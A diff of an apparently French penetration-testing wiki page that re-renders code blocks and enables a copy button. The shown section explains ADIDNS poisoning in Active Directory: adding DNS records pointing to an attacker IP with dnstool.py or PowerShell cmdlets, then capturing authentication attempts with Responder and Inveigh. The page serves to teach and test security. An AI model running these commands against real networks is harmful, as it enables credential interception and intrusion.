@@ -7666,21 +7666,21 @@
 <p>Par défaut, un utilisateur peut ajouter une entrée dans le serveur dns de l'AD et faire pointer ce sous domaine vers, par exemple, l'ip d'un poste attaquant. Il est ensuite possible d'utiliser un outil tel que responder pour éventuellement récupérer des tentatives de connexions (imaginons par exemple un script de monitoring sur les différentes entrées du domaine, un lecteur réseau qui n'est plus utilisé ou autre...).</p>
 <p>Utilisation de dnstool (https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)</p>
 <p>Ajouter un enregistrement DNS (depuis linux):</p>
-<pre><code class="language-bash">dnstool.py -u 'DOMAIN\user' -p 'password' --record 'sousDomaine' --action add --data $AttackerIP $DomainController
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>dnstool.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;DOMAIN\user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password&#39;</span><span class="w"> </span>--record<span class="w"> </span><span class="s1">&#39;sousDomaine&#39;</span><span class="w"> </span>--action<span class="w"> </span>add<span class="w"> </span>--data<span class="w"> </span><span class="nv">$AttackerIP</span><span class="w"> </span><span class="nv">$DomainController</span>
+</span></code></pre></div>
 <p>Depuis Windows:</p>
-<pre><code class="language-bash">Set-ADIDNSNodeAttribute -Node sousDomaine -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose
-
-# Activer/désactiver un node:
-Enable-ADIDNSNode -Node *
-Disable-ADIDNSNode -Node *
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Set-ADIDNSNodeAttribute<span class="w"> </span>-Node<span class="w"> </span>sousDomaine<span class="w"> </span>-Attribute<span class="w"> </span>DNSRecord<span class="w"> </span>-Value<span class="w"> </span><span class="o">(</span>New-DNSRecordArray<span class="w"> </span>-Data<span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="o">)</span><span class="w"> </span>-Verbose
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1"># Activer/désactiver un node:</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Enable-ADIDNSNode<span class="w"> </span>-Node<span class="w"> </span>*
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Disable-ADIDNSNode<span class="w"> </span>-Node<span class="w"> </span>*
+</span></code></pre></div>
 <p>Utilisation de responder:</p>
-<pre><code class="language-bash">sudo responder -I tun0 -d -D
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-d<span class="w"> </span>-D
+</span></code></pre></div>
 <p>Depuis Windows, il est possible d'automatiser le processus (Inveigh va checker si des appels DNS n'aboutissent à rien, si c'est le cas il va créer l'entrée DNS en question et la rediriger vers lui pour récupérer d'éventuelles informations):</p>
-<pre><code class="language-powershell">Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Invoke-Inveigh</span> <span class="n">-ConsoleOutput</span> <span class="n">Y</span> <span class="n">-ADIDNS</span> <span class="n">combo</span><span class="p">,</span><span class="n">ns</span><span class="p">,</span><span class="n">wildcard</span> <span class="n">-ADIDNSThreshold</span> <span class="n">3</span> <span class="n">-LLMNR</span> <span class="n">Y</span> <span class="n">-NBNS</span> <span class="n">Y</span> <span class="n">-mDNS</span> <span class="n">Y</span> <span class="n">-Challenge</span> <span class="n">1122334455667788</span> <span class="n">-MachineAccounts</span>
+</span></code></pre></div>
 
 
 
@@ -7727,7 +7727,7 @@ Disable-ADIDNSNode -Node *
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
